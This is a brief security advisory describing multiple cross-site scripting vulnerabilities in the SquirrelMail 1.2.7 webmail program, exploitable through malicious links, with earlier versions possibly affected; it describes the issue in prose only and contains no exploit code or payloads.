SquirrelMail is a feature rich webmail program implemented in the PHP4 language. It is available for Linux and Unix based operating systems.

Multiple cross site scripting vulnerabilities have been discovered in various PHP scripts included with SquirrelMail. By including embedded commands into a malicious link, it is possible for an attacker to execute HTML and script code on a web client in the context of the site hosting the webmail system.

This issue was reported for SquirrelMail 1.2.7, earlier versions may also be affected.
